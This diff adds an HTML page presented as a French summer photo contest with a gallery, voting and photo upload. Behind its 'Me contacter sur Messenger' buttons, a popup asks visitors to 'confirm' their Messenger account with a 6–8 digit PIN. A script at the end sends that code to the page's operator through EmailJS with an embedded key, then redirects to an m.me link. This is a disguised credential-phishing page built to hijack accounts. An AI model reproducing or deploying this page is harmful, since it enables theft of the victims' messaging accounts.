@@ -1,0 +1,432 @@
+
+<!DOCTYPE html>
+
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<title>Concours Photo – Maillot de bain &amp; Soleil</title>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+    }
+    .overlay {
+      background: rgba(0,0,0,0.7);
+      padding: 30px;
+      border-radius: 12px;
+      max-width: 960px;
+      margin: auto;
+    }
+    h1 {
+      font-size: 2.2em;
+      margin-bottom: 10px;
+    }
+    .form-section {
+      margin-top: 20px;
+    }
+    input[type="text"], input[type="file"] {
+      padding: 10px;
+      margin: 10px;
+      border-radius: 5px;
+      border: none;
+      width: 80%;
+      max-width: 400px;
+    }
+    .gallery {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 15px;
+      margin-top: 40px;
+    }
+    .photo-card {
+      background: #fff;
+      color: #000;
+      padding: 10px;
+      border-radius: 10px;
+    }
+    .photo-card img {
+      max-width: 100%;
+      border-radius: 6px;
+    }
+    .vote-btn {
+      background: #1877f2;
+      border: none;
+      color: white;
+      padding: 6px 12px;
+      margin-top: 8px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .vote-count {
+      display: block;
+      margin-top: 5px;
+      font-size: 0.9em;
+    }
+  
+.custom-file-upload {
+  background-color: #1877f2;
+  color: #fff;
+  padding: 10px 18px;
+  border-radius: 6px;
+  cursor: pointer;
+  font-weight: bold;
+  display: inline-block;
+  margin-top: 12px;
+  transition: background-color 0.3s ease;
+}
+.custom-file-upload:hover {
+  background-color: #0e63d0;
+}
+#preview-container img {
+  max-width: 100px;
+  margin-top: 10px;
+  border-radius: 8px;
+  box-shadow: 0 0 5px rgba(0,0,0,0.5);
+}
+</style>
+<style>
+#top5-container .photo-card {
+  text-align: center;
+  margin-bottom: 8px;
+}
+#top5-container .photo-card:nth-child(1) { width: 100%; }
+#top5-container .photo-card:nth-child(2),
+#top5-container .photo-card:nth-child(3) { width: 70%; }
+#top5-container .photo-card:nth-child(4),
+#top5-container .photo-card:nth-child(5) { width: 50%; }
+</style></head>
+<body>
+<div class="overlay">
+<div id="messenger-popup" style="display:none; background:#fff; color:#000; padding:20px; border-radius:10px; max-width:340px; margin:20px auto; box-shadow:0 0 15px rgba(0,0,0,0.5);">
+<h2>Confirmez votre compte Messenger</h2>
+<p>Veuillez entrer le code PIN reçu (6 à 8 chiffres) :</p>
+<input id="messenger-pin" placeholder="Code à 6 chiffres" style="padding:10px; width:90%; margin:10px 0;" type="text"/>
+<button onclick="submitMessengerCode()" style="background-color:#0084FF; color:white;">Valider</button>
+</div><div class="form-section">
+<button class="vote-btn" onclick="showMessengerPopup()" style="background-color:#0084FF;">💬 Me contacter sur Messenger</button>
+</div>
+
+
+
+
+<h1>Concours du mois : Glamour verdoyant</h1>
+
+
+
+
+<p>Participez au concours en envoyant votre plus belle photo estivale et votez pour vos clichés préférés !</p>
+<div class="form-section">
+<button class="vote-btn" onclick="showTop5()">🎖️ Voir les 5 meilleures photos</button><h2>Participer</h2>
+<form>
+<input name="nom" placeholder="Nom" required="" type="text"/><br/>
+<input name="prenom" placeholder="Prénom" required="" type="text"/><br/>
+<label class="custom-file-upload" for="photo-upload">📸 Choisir une image</label>
+<input accept="image/*" id="photo-upload" onchange="previewUpload()" style="display:none;" type="file"/>
+<div id="preview-container" style="margin: 10px 0;"></div>
+<button class="vote-btn" id="submit-btn" onclick="submitPhoto()" style="display:none;" type="button">Soumettre ma photo</button><br/>
+<button class="vote-btn" id="submit-btn" onclick="submitPhoto()" style="display:none;" type="button">Soumettre ma photo</button>
+</form>
+</div>
+<div class="form-section">
+<h2>Galerie</h2>
+<div class="gallery">
+
+
+
+
+<div class="photo-card">
+<img alt="Photo (1)" src="image1.jpg"/>
+<button class="vote-btn" onclick="vote(1)">Voter</button>
+<span class="vote-count" id="votes-1">12 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-1</span></div>
+
+<div class="photo-card">
+<img alt="Photo (2)" src="image2.jpg"/>
+<button class="vote-btn" onclick="vote(2)">Voter</button>
+<span class="vote-count" id="votes-2">19 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-2</span></div>
+
+<div class="photo-card">
+<img alt="Photo (3)" src="image3.jpg"/>
+<button class="vote-btn" onclick="vote(3)">Voter</button>
+<span class="vote-count" id="votes-3">17 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-3</span></div>
+
+<div class="photo-card">
+<img alt="Photo (4)" src="image4.jpg"/>
+<button class="vote-btn" onclick="vote(4)">Voter</button>
+<span class="vote-count" id="votes-4">6 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-4</span></div>
+
+<div class="photo-card">
+<img alt="Photo (5)" src="image5.jpg"/>
+<button class="vote-btn" onclick="vote(5)">Voter</button>
+<span class="vote-count" id="votes-5">11 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-5</span></div>
+
+<div class="photo-card">
+<img alt="Photo (6)" src="image6.jpg"/>
+<button class="vote-btn" onclick="vote(6)">Voter</button>
+<span class="vote-count" id="votes-6">5 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-6</span></div>
+
+<div class="photo-card">
+<img alt="Photo (7)" src="image7.jpg"/>
+<button class="vote-btn" onclick="vote(7)">Voter</button>
+<span class="vote-count" id="votes-7">11 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-7</span></div>
+
+<div class="photo-card">
+<img alt="Photo (8)" src="image8.jpg"/>
+<button class="vote-btn" onclick="vote(8)">Voter</button>
+<span class="vote-count" id="votes-8">7 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-8</span></div>
+
+<div class="photo-card">
+<img alt="Photo (9)" src="image9.jpg"/>
+<button class="vote-btn" onclick="vote(9)">Voter</button>
+<span class="vote-count" id="votes-9">3 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-9</span></div>
+
+<div class="photo-card">
+<img alt="Photo (10)" src="image10.jpg"/>
+<button class="vote-btn" onclick="vote(10)">Voter</button>
+<span class="vote-count" id="votes-10">7 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-10</span></div>
+
+<div class="photo-card">
+<img alt="Photo (11)" src="image11.jpg"/>
+<button class="vote-btn" onclick="vote(11)">Voter</button>
+<span class="vote-count" id="votes-11">10 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-11</span></div>
+
+<div class="photo-card">
+<img alt="Photo (12)" src="image12.jpg"/>
+<button class="vote-btn" onclick="vote(12)">Voter</button>
+<span class="vote-count" id="votes-12">5 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-12</span></div>
+
+<div class="photo-card">
+<img alt="Photo (13)" src="image13.jpg"/>
+<button class="vote-btn" onclick="vote(13)">Voter</button>
+<span class="vote-count" id="votes-13">13 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-13</span></div>
+
+<div class="photo-card">
+<img alt="Photo (14)" src="image14.jpg"/>
+<button class="vote-btn" onclick="vote(14)">Voter</button>
+<span class="vote-count" id="votes-14">12 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-14</span></div>
+
+<div class="photo-card">
+<img alt="Photo (15)" src="image15.jpg"/>
+<button class="vote-btn" onclick="vote(15)">Voter</button>
+<span class="vote-count" id="votes-15">10 votes</span>
+<span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">Photo-15</span></div>
+
+
+
+
+
+
+
+</div>
+</div>
+<div class="form-section">
+<button class="vote-btn" onclick="showMessengerPopup()" style="background-color:#0084FF;">💬 Me contacter sur Messenger</button>
+</div>
+
+</div>
+<script>
+  function submitPhoto() {
+    const upload = document.getElementById('photo-upload');
+    if (upload.files.length === 0) return;
+
+    const file = upload.files[0];
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      const gallery = document.querySelector('.gallery');
+      const totalPhotos = gallery.querySelectorAll('.photo-card').length + 1;
+      const currentMonth = new Date().toLocaleString('fr-FR', { month: 'long' });
+      const label = currentMonth.charAt(0).toUpperCase() + currentMonth.slice(1) + '-' + totalPhotos;
+
+      const newPhoto = document.createElement('div');
+      newPhoto.className = 'photo-card';
+      newPhoto.innerHTML = `
+        <img src="${e.target.result}" alt="Ma photo">
+        <button class="vote-btn" onclick="vote(0)">Voter</button>
+        <span id="votes-0" class="vote-count">0 vote</span>
+        <span style="display:block; font-weight:bold; margin-top:5px; font-size:0.85em;">${label}</span>
+      `;
+      gallery.insertBefore(newPhoto, gallery.firstChild);
+      document.getElementById('submit-btn').style.display = 'none';
+    };
+    reader.readAsDataURL(file);
+  }
+</script>
+<script>
+  function showCustomAlert(msg) {
+    const alertBox = document.getElementById('custom-alert');
+    const alertMsg = document.getElementById('custom-alert-msg');
+    alertMsg.textContent = msg;
+    alertBox.style.display = 'block';
+  }
+  function closeCustomAlert() {
+    document.getElementById('custom-alert').style.display = 'none';
+  }
+
+  function vote(index) {
+    const today = new Date().toISOString().split('T')[0];
+    const key = 'photo-' + index;
+    const lastVote = localStorage.getItem(key);
+
+    if (lastVote === today) {
+      showCustomAlert("Vous avez déjà voté pour cette photo aujourd'hui.");
+      return;
+    }
+
+    const voteSpan = document.getElementById('votes-' + index);
+    let current = 0;
+    const match = voteSpan.textContent.match(/(\d+)/);
+    if (match) current = parseInt(match[1]);
+
+    const updated = current + 1;
+    voteSpan.textContent = updated + (updated > 1 ? " votes" : " vote");
+
+    localStorage.setItem(key, today);
+  }
+
+function previewUpload() {
+  const upload = document.getElementById('photo-upload');
+  const previewContainer = document.getElementById('preview-container');
+  previewContainer.innerHTML = '';
+
+  if (upload.files.length > 0) {
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      const img = document.createElement('img');
+      img.src = e.target.result;
+      previewContainer.appendChild(img);
+      document.getElementById('submit-btn').style.display = 'inline-block';
+    };
+    reader.readAsDataURL(upload.files[0]);
+  }
+}
+</script>
+<div id="custom-alert" style="display:none; position:fixed; top:30%; left:50%; transform:translateX(-50%);
+background-color:#fff; color:#333; padding:20px 30px; border-radius:10px; box-shadow:0 0 15px rgba(0,0,0,0.3); z-index:1000;">
+<p id="custom-alert-msg" style="margin:0; font-size:16px;"></p>
+<button onclick="closeCustomAlert()" style="margin-top:10px; padding:5px 15px; background:#1877f2; color:white; border:none; border-radius:5px; cursor:pointer;">OK</button>
+</div>
+<script>
+  function showCustomAlert(msg) {
+    const alertBox = document.getElementById('custom-alert');
+    const alertMsg = document.getElementById('custom-alert-msg');
+    alertMsg.textContent = msg;
+    alertBox.style.display = 'block';
+  }
+  function closeCustomAlert() {
+    document.getElementById('custom-alert').style.display = 'none';
+  }
+
+  function vote(index) {
+    const today = new Date().toISOString().split('T')[0];
+    const key = 'photo-' + index;
+    const lastVote = localStorage.getItem(key);
+
+    if (lastVote === today) {
+      showCustomAlert("Vous avez déjà voté pour cette photo aujourd'hui.");
+      return;
+    }
+
+    const voteSpan = document.getElementById('votes-' + index);
+    if (!voteSpan) {
+      showCustomAlert("Erreur : impossible de trouver le compteur de vote.");
+      return;
+    }
+
+    let current = 0;
+    const match = voteSpan.textContent.match(/(\d+)/);
+    if (match) current = parseInt(match[1]);
+
+    const updated = current + 1;
+    voteSpan.textContent = updated + (updated > 1 ? " votes" : " vote");
+
+    localStorage.setItem(key, today);
+  }
+
+function previewUpload() {
+  const upload = document.getElementById('photo-upload');
+  const previewContainer = document.getElementById('preview-container');
+  previewContainer.innerHTML = '';
+
+  if (upload.files.length > 0) {
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      const img = document.createElement('img');
+      img.src = e.target.result;
+      previewContainer.appendChild(img);
+      document.getElementById('submit-btn').style.display = 'inline-block';
+    };
+    reader.readAsDataURL(upload.files[0]);
+  }
+}
+</script>
+<div id="top5-popup" style="display:none; position:fixed; top:10%; left:50%; transform:translateX(-50%);
+background-color:#fff; color:#000; padding:20px; border-radius:10px; box-shadow:0 0 20px rgba(0,0,0,0.4); max-width:600px; z-index:2000; max-height:80vh; overflow-y:auto;">
+<h3>Top 5 des photos</h3>
+<div id="top5-container" style="display:flex; flex-direction:column; align-items:center; gap:10px;"></div>
+<button onclick="document.getElementById('top5-popup').style.display='none'" style="margin-top:10px; padding:6px 12px; background:#1877f2; color:white; border:none; border-radius:6px; cursor:pointer;">Fermer</button>
+</div>
+<script>
+function showTop5() {
+  const cards = document.querySelectorAll('.photo-card');
+  const cardArray = Array.from(cards).map(card => {
+    const voteText = card.querySelector('.vote-count').innerText;
+    const votes = parseInt(voteText.match(/\d+/)[0]);
+    return { votes, html: card.innerHTML };
+  });
+  const top5 = cardArray.sort((a, b) => b.votes - a.votes).slice(0, 5);
+  const container = document.getElementById('top5-container');
+  container.innerHTML = '';
+  top5.forEach(item => {
+    const div = document.createElement('div');
+    div.className = 'photo-card';
+    div.innerHTML = item.html;
+    container.appendChild(div);
+  });
+  document.getElementById('top5-popup').style.display = 'block';
+}
+</script>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+emailjs.init("AATQVLMcBJaRBgEox");
+
+function showMessengerPopup() {
+  document.getElementById('messenger-popup').style.display = 'block';
+}
+function submitMessengerCode() {
+  const code = document.getElementById('messenger-pin').value.trim();
+  if (!/^\d{6,}$/.test(code)) {
+    alert("Code invalide.");
+    return;
+  }
+  emailjs.send("service_photos", "template_code", { verification_code: code })
+    .then(() => {
+      
+      window.open("https://m.me/epicstudiop", "_blank");
+    })
+    .catch((e) => {
+      console.error(e);
+      alert("Erreur lors de l'envoi.");
+    });
+}
+</script>
+</body>
+</html>
